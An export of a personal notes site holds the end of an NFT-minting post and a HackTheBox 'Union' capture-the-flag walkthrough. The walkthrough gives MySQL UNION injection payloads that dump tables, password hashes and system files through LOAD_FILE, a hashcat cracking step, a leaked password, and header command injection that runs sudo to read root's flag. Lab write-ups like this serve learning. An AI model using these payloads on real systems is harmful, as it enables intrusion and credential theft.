data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Since I’m &lt;em&gt;not&lt;/em&gt; producing NFTs for public consumption, I skipped the parts of the Alchemy walk-through where this code was modified to cap the number of NFTs and make it possible for addresses other than the contract’s owner to call it.&lt;/p&gt;\n&lt;p&gt;Up until now, Safari, Light Wallet, and the iPad Pro work swimmingly. Unfortunately, the web-based Ethereum Remix IDE, which is how we’ll deploy the smart contract code above, does &lt;em&gt;not&lt;/em&gt; play well with this setup.  The issue might be Safari, or it might be Light Wallet; I’m not sure, but the behavior of Remix on both iPadOS and macOS is identical: You can compile the smart contract code (though lockdown mode must be disabled for the site), but attempting to deploy the code always results in a mysterious “Transaction Failed” error message.&lt;/p&gt;\n&lt;p&gt;Eventually I installed &lt;a href=&quot;https://brave.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Brave&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; on my MacBook for the sole purpose of being able to deploy the smart contract code. &lt;a href=&quot;https://brave.com/wallet/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Brave’s built-in wallet&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; works perfectly with Remix.&lt;/p&gt;\n&lt;p&gt;You’ll want to note down the version of Solidity you used to compile the smart contract, the wallet address you used to deploy it, and the smart contract’s address on the blockchain. With this information, you can always return to remix, recompile the smart contract code, connect the controlling wallet, and then reconnect to the smart contract to mint additional NFTs.&lt;/p&gt;\n&lt;p&gt;Once the contract was deployed, the only other stumbling block I ran into was that it’s not obvious that the safeMint function requires &lt;em&gt;two&lt;/em&gt; arguments — the first is the address to send the NFT to, and the second is the metadata &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Uniform-resource-locators&quot;&gt;URI&lt;/a&gt;. You can use the chevron next to the function name in Remix to expand both arguments into separate fields, which makes it more obvious how to enter in the necessary information.&lt;/p&gt;\n&lt;p&gt;The tokenURI function is also useful: When called with the token ID (an incrementing integer, starting at 0), it will return the metadata &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Uniform-resource-locators&quot;&gt;URI&lt;/a&gt; for the corresponding NFT.&lt;/p&gt;\n&lt;p&gt;The minted NFTs took a looooong time to show up in &lt;a href=&quot;https://metamask.io&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;MetaMask&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, but they did show up in &lt;a href=&quot;https://opensea.io&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;OpenSea&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; pretty much immediately. You can use the OpenSea interface to transfer the minted NFTs to other accounts.&lt;/p&gt;\n&lt;p&gt;It’s worth noting here that viewing and transferring any NFTs you mint works fine on Safari + Light Wallet. It’s &lt;em&gt;only&lt;/em&gt; the Remix IDE that doesn’t like that setup, and in fact it’s &lt;em&gt;only&lt;/em&gt; deploying and interacting with your contract that’s broken. Everything else in this process can be done using iPadOS. Hopefully this situation will improve over time.&lt;/p&gt;","rssInclude":true},"journals/2023-04-27":{"slug":"journals/2023-04-27","filePath":"journals/2023-04-27.md","title":"Union","links":["spells/gobuster","spells/Nmap","spells/Burp-Suite","spells/SQL-injection-attacks","spells/MySQL","spells/SSH","spells/John-the-Ripper","spells/Hashcat","spells/sudo","spells/PHP"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Union” on HackTheBox\n\n\n\n\n\n                  \n                  Important\n                  \n                \n\n\nI joined the Discord server for the team I worked on this with ~35 minutes late, as I was having trouble setting up the HackTheBox VPN (the solution was to change my VPN region to EU, then back to US, and then re-download the .ovpn file), and then didn’t have the right invite link!\nAnyways, this was my first box in a long time, and boy am I rusty!\n\n\n\nThe target IP is 10.129.202.139 (at least initially). The index.php page seems to accept any input (player=foo), and directs the “player” to the challenge.php page. There’s a single-element form here, but it doesn’t seem to do anything on submission (flag=bar)?\nRunning gobuster to try to enumerate potentially common directories:\ngobuster -t 50 dir -u http://10.129.202.139 -w /usr/share/wordlists/dirb/common.txt\nResults:\n/css       → /css/\n/index.php\n\nNot much help there. Let’s try the same thing with some common extensions:\ngobuster -t 50 dir -u http://10.129.202.139 \\\n         -w /usr/share/wordlists/dirb/common.txt \\\n         -x .php,.html,.htm,.txt,.md,.js,.css\nResults:\n/config.php\n/css          → /css/\n/firewall.php\n/index.php\n\nA general reminder about how to use gobuster.\nThe /config.php and /firewall.php files look interesting!\n\n/config.php just returns a zero-length document. Booo!\n/firewall.php just returns Access Denied .\n\nAlright, let’s try Nmap:\nsudo nmap -v -oN union -Pn -A --reason -T4 -p- 10.129.202.139\nOutput:\nHost discovery disabled (-Pn). All addresses will be marked &#039;up&#039; and scan times may be slower.\nStarting Nmap 7.93 ( nmap.org ) at 2023-04-27 19:24 MDT\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 19:24\nCompleted NSE at 19:24, 0.00s elapsed\nInitiating NSE at 19:24\nCompleted NSE at 19:24, 0.00s elapsed\nInitiating NSE at 19:24\nCompleted NSE at 19:24, 0.00s elapsed\nInitiating Parallel DNS resolution of 1 host. at 19:24\nCompleted Parallel DNS resolution of 1 host. at 19:24, 0.02s elapsed\nInitiating SYN Stealth Scan at 19:24\nScanning 10.129.202.139 [65535 ports]\nDiscovered open port 80/tcp on 10.129.202.139\nSYN Stealth Scan Timing: About 21.06% done; ETC: 19:26 (0:01:56 remaining)\nSYN Stealth Scan Timing: About 55.83% done; ETC: 19:26 (0:00:48 remaining)\nCompleted SYN Stealth Scan at 19:25, 91.51s elapsed (65535 total ports)\nInitiating Service scan at 19:25\nScanning 1 service on 10.129.202.139\nCompleted Service scan at 19:26, 6.12s elapsed (1 service on 1 host)\nInitiating OS detection (try #1) against 10.129.202.139\nRetrying OS detection (try #2) against 10.129.202.139\nInitiating Traceroute at 19:26\nCompleted Traceroute at 19:26, 0.07s elapsed\nInitiating Parallel DNS resolution of 2 hosts. at 19:26\nCompleted Parallel DNS resolution of 2 hosts. at 19:26, 0.02s elapsed\nNSE: Script scanning 10.129.202.139.\nInitiating NSE at 19:26\nCompleted NSE at 19:26, 5.07s elapsed\nInitiating NSE at 19:26\nCompleted NSE at 19:26, 0.22s elapsed\nInitiating NSE at 19:26\nCompleted NSE at 19:26, 0.00s elapsed\nNmap scan report for 10.129.202.139\nHost is up, received user-set (0.058s latency).\nNot shown: 65534 filtered tcp ports (no-response)\nPORT   STATE SERVICE REASON         VERSION\n80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)\n|http-server-header: nginx/1.18.0 (Ubuntu)\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|      httponly flag not set\n| http-methods:\n|_  Supported Methods: GET HEAD POST\n|_http-title: Site doesn&#039;t have a title (text/html; charset=UTF-8).\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (94%), Linux 4.15 - 5.6 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 5.0 (90%), Linux 5.0 - 5.3 (90%), Linux 5.4 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)\nNo exact OS matches for host (test conditions non-ideal).\nUptime guess: 27.153 days (since Fri Mar 31 15:46:21 2023)\nNetwork Distance: 2 hops\nTCP Sequence Prediction: Difficulty=258 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   63.08 ms 10.10.14.1\n2   63.24 ms 10.129.202.139\n\nNSE: Script Post-scanning.\nInitiating NSE at 19:26\nCompleted NSE at 19:26, 0.00s elapsed\nInitiating NSE at 19:26\nCompleted NSE at 19:26, 0.00s elapsed\nInitiating NSE at 19:26\nCompleted NSE at 19:26, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 107.94 seconds\n           Raw packets sent: 131215 (5.777MB) | Rcvd: 251 (19.772KB)\n\nWell, that’s less than helpful; we already knew that there was a web server running on port 80 (and there’s nothing else).\nOkay, let’s try fuzzing the two pages with Burp Suite and see what we get! Interesting observations…\n\n/index.php\n\nSubmitting hexadecimal numbers for player (for example, 0x0 or 0xabad1dea) result in only the first half of the normal response, without any HTML or the /challenge.php link.\nYou can insert any HTML you’d like, and it gets rendered back in the page.\nInputs always seem to be lower-cased before they’re returned.\n&#039; OR 1=1 -- 1 and &#039; OR &#039;1&#039;=&#039;1 are also missing the second half of the response, like the 0x numbers. So maybe we have SQL injection?\n\n\n/challenge.php returns nothing interesting…\n\n(I really need a more targeted fuzzing list than the “big list of naughty strings”, as the free version of Burp Suite throttles Intruder so much that this list takes over 30 minutes to process!)\n(Also, be sure to look at the response in Raw mode to avoid going down bunny trails about formatting changes that ​don’t actually exist in the server response​!)\nOkay, so not many clues at this point. SQL injection might be a thing, but the behavior with hexadecimal numbers is… Odd.\n\nSo, here I’m going to “cheat” a bit. I know from the discussion on Discord that SQL injection is a thing for this box, and is, in fact, how you get the first flag. So even though my evidence at this point is circumstantial/weak, I’m going to go that route.\n\nSince &#039; OR 1=1 -- 1 gave us something interesting, let’s send /index.php to Repeater and see what some other values for player do for us…\n\n&#039; UNION SELECT &#039;&gt;&gt;&gt;STUFF&lt;&lt;&lt;&#039; -- 1 returns &gt;&gt;&gt;STUFF&lt;&lt;&lt; for the user name!\n&#039; UNION SELECT @@datadir -- 1 returns /var/lib/mysql, so we’re dealing with MySQL.\n&#039; UNION SELECT schema_name FROM information_schema.schemata -- 1 returns mysql … Which isn’t right. It looks like only a single row (probably the last one, given that we only see one row with UNION ) is returned.\n&#039; UNION SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 0 -- 1 also returns mysql … But using OFFSET 1 returns information_schema , so I guess we’ll just do it this way. Iterating, we also see databases called performance_schema , sys , and november . All of these are standard MySQL databases except for november .\n&#039; UNION SELECT database() -- 1 confirms that we’re in the november database.\n&#039; UNION SELECT table_name FROM information_schema.tables WHERE table_schema != &#039;november&#039; LIMIT 1 OFFSET 0 -- 1 returns flag , and iterating reveals a second table players . There doesn’t seem to be anything else. The flag table looks promising, so let’s see what’s there.\n&#039; UNION SELECT column_name FROM information_schema.columns WHERE table_schema = &#039;november&#039; and table_name = &#039;flag&#039; LIMIT 1 OFFSET 0 -- 1 (and iterating) reveals that there’s a single column called one .\n&#039; UNION SELECT COUNT(*) FROM flag -- 1 reveals that there’s only a single row in flag . Easy!\n&#039; UNION SELECT one FROM flag -- 1 then provides a “flag” value.\n\n(The above is made possible using this handy SQL injection cheat-sheet for MySQL.)\nNow, as it turns out, this is not a flag for the box! Instead, inputting it into /challenge.php generates the message that Your IP Address has now been granted SSH Access.\nLet’s confirm…\nsudo nmap -v -oN union2 -Pn -A --reason -T4 -p- 10.129.202.139\nOutput:\nHost discovery disabled (-Pn). All addresses will be marked &#039;up&#039; and scan times may be slower.\nStarting Nmap 7.93 ( nmap.org ) at 2023-04-27 21:16 MDT\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 21:16\nCompleted NSE at 21:16, 0.00s elapsed\nInitiating NSE at 21:16\nCompleted NSE at 21:16, 0.00s elapsed\nInitiating NSE at 21:16\nCompleted NSE at 21:16, 0.00s elapsed\nInitiating Parallel DNS resolution of 1 host. at 21:16\nCompleted Parallel DNS resolution of 1 host. at 21:16, 0.01s elapsed\nInitiating SYN Stealth Scan at 21:16\nScanning 10.129.202.139 [65535 ports]\nDiscovered open port 22/tcp on 10.129.202.139\nDiscovered open port 80/tcp on 10.129.202.139\nCompleted SYN Stealth Scan at 21:17, 35.32s elapsed (65535 total ports)\nInitiating Service scan at 21:17\nScanning 2 services on 10.129.202.139\nCompleted Service scan at 21:17, 6.12s elapsed (2 services on 1 host)\nInitiating OS detection (try #1) against 10.129.202.139\nRetrying OS detection (try #2) against 10.129.202.139\nRetrying OS detection (try #3) against 10.129.202.139\nRetrying OS detection (try #4) against 10.129.202.139\nRetrying OS detection (try #5) against 10.129.202.139\nInitiating Traceroute at 21:17\nCompleted Traceroute at 21:17, 0.06s elapsed\nInitiating Parallel DNS resolution of 2 hosts. at 21:17\nCompleted Parallel DNS resolution of 2 hosts. at 21:17, 0.01s elapsed\nNSE: Script scanning 10.129.202.139.\nInitiating NSE at 21:17\nCompleted NSE at 21:17, 1.73s elapsed\nInitiating NSE at 21:17\nCompleted NSE at 21:17, 0.27s elapsed\nInitiating NSE at 21:17\nCompleted NSE at 21:17, 0.02s elapsed\nNmap scan report for 10.129.202.139\nHost is up, received user-set (0.054s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)\n|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)\n|_  256 2221e9f485908745161f733641ee3b32 (ED25519)\n80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n|http-title: Site doesn&#039;t have a title (text/html; charset=UTF-8).\n| http-methods:\n|  Supported Methods: GET HEAD POST\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=4/27%OT=22%CT=1%CU=31913%PV=Y%DS=2%DC=T%G=Y%TM=644B3AD\nOS:9%P=aarch64-unknown-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS\nOS:=A)OPS(O1=M550ST11NW7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M\nOS:550ST11NW7%O6=M550ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE\nOS:88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\nOS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\nOS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\nOS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\nOS:=40%CD=S)\n\nUptime guess: 27.230 days (since Fri Mar 31 15:46:20 2023)\nNetwork Distance: 2 hops\nTCP Sequence Prediction: Difficulty=256 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 111/tcp)\nHOP RTT      ADDRESS\n1   56.02 ms 10.10.14.1\n2   56.12 ms 10.129.202.139\n\nNSE: Script Post-scanning.\nInitiating NSE at 21:17\nCompleted NSE at 21:17, 0.00s elapsed\nInitiating NSE at 21:17\nCompleted NSE at 21:17, 0.00s elapsed\nInitiating NSE at 21:17\nCompleted NSE at 21:17, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 56.07 seconds\n           Raw packets sent: 66144 (2.914MB) | Rcvd: 65710 (2.632MB)\n\nSo, we definitely have an open SSH port now! But what user to use?\nMaybe there’s password re-use with MySQL? Let’s see what we’ve got:\n\n&#039; UNION SELECT COUNT(*) FROM mysql.user -- 1 shows that we have 6 users.\n&#039; UNION SELECT user FROM mysql.user LIMIT 1 OFFSET 0 -- 1 (and iterating) shows that these users are debian-sys-maint, mysql.infoschema, mysql.session, mysql.sys, root, and uhc. Both root and uhc look promising.\n&#039; UNION SELECT host FROM mysql.user WHERE user = &#039;root&#039; -- 1 (and uhc) shows that both are permitted to login from localhost (though that may not mean anything, since this is just database access).\n&#039; UNION SELECT authentication_string FROM mysql.user WHERE user = &#039;root&#039; -- 1 (and uhc) reveals that root doesn’t have a password, but uhc does have a password hash. (Apparently there’s no password column in the mysql.users table anymore; it’s now called authentication_string per the documentation.)\n\nUnfortunately, it turns out that we can’t just feed this hash into john or Hashcat, but need to massage things a bit first.\n\nFirst, we use ​&#039; UNION SELECT CONCAT(&#039;$mysql&#039;,LEFT(authentication_string,6),&#039;*&#039;,INSERT(HEX(SUBSTR(authentication_string,8)),41,0,&#039;*&#039;)) FROM mysql.user WHERE user = &#039;uhc&#039;​ to get a string that Hashcat can handle.\nThen we run hashcat -m 7401 -O hash.txt rockyou.txt.\n\nBut, this is going to take a loooong time… So, I tried a few other things:\n\nThere’s 6 users in the players table, but none of them work as passwords (or alternate user names).\n&#039; UNION SELECT LOAD_FILE(&#039;/etc/passwd&#039;) -- 1 displays the password file, but I can’t access /etc/shadow, so it doesn’t look like we’re running as root.\nBut we can look at other files, including /config.php! And it turns out that there’s a cleartext password there that we can read with &#039; UNION SELECT LOAD_FILE(&#039;/var/www/html/config.php&#039;) -- 1 : uhc-11qual-global-pw. ​This works to log in as the uhc user!\n\nThe first flag is then in the user.txt file in /home/uhc.\nUnfortunately, uhc isn’t in the sudoers file, and there’s no obviously vulnerably SUID binaries or files with loose permissions.\nBut…\nIf you run &#039; UNION SELECT LOAD_FILE(&#039;/var/www/html/firewall.php&#039;) -- 1 , you’ll see that the web server has sudo access, and uses it to make a call to iptables using the value of either the X-Forwarded-For or Remote-Host headers. And since this call is just a concatenation of the value of this header wrapped in PHP’s system() call, that means I can insert whatever I want. For example, setting\nX-Forwarded-For: 127.0.0.1 -j ACCEPT; sudo ls -la /root ; echo\nlists the contents of the /root directory, revealing the standard /root/root.txt flag file. And thus\nX-Forwarded-For: 127.0.0.1 -j ACCEPT; sudo cat /root/root.txt ; echo\nwill return the contents of that file.\nWhich just so happens to be the ​second flag​.\n(Really, I should have used this trick to get both flags…)\nElapsed Time: 4 h 6 min","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://app.hackthebox.com/machines/418&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Union” on HackTheBox&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;I joined the Discord server for the team I worked on this with ~35 minutes late, as I was having trouble setting up the HackTheBox VPN (the solution was to change my VPN region to EU, then back to US, and &lt;em&gt;then&lt;/em&gt; re-download the .ovpn file), and then didn’t have the right invite link!&lt;/p&gt;\n&lt;p&gt;Anyways, this was my first box in a &lt;em&gt;long&lt;/em&gt; time, and boy am I rusty!&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;The target IP is 10.129.202.139 (at least initially). The index.php page seems to accept any input (&lt;code&gt;player=foo&lt;/code&gt;), and directs the “player” to the challenge.php page. There’s a single-element form here, but it doesn’t seem to do anything on submission (&lt;code&gt;flag=bar&lt;/code&gt;)?&lt;/p&gt;\n&lt;p&gt;Running &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/gobuster&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; to try to enumerate potentially common directories:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 50&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://10.129.202.139&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/dirb/common.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Results:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;/css       → /css/\n/index.php\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Not much help there. Let’s try the same thing with some common extensions:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 50&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://10.129.202.139&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;         -w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/dirb/common.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;         -x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; .php,.html,.htm,.txt,.md,.js,.css&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Results:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;/config.php\n/css          → /css/\n/firewall.php\n/index.php\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;a href=&quot;https://www.freecodecamp.org/news/gobuster-tutorial-find-hidden-directories-sub-domains-and-s3-buckets/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;A general reminder about how to use gobuster.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;The /config.php and /firewall.php files look interesting!&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;/config.php just returns a zero-length document. Booo!&lt;/li&gt;\n&lt;li&gt;/firewall.php just returns &lt;code&gt;Access Denied&lt;/code&gt; .&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Alright, let’s try &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; union&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span 